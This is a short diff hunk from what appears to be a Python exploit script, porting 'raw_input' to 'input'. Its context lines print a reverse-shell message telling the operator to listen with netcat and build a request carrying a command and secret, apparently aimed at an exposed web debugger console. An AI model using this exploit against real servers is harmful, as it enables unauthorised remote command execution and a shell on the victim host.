@@ -42,7 +42,7 @@ print(
     "[+] Sending reverse shell to {}:{}, please  use netcat listening in {}:{}".format(sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4])
 )
 
-raw_input("PRESS ENTER TO EXPLOIT")
+input("PRESS ENTER TO EXPLOIT")
 
 data = {"__debugger__": __debugger__, "cmd": str(cmd), "frm": frm, "s": secret}
 
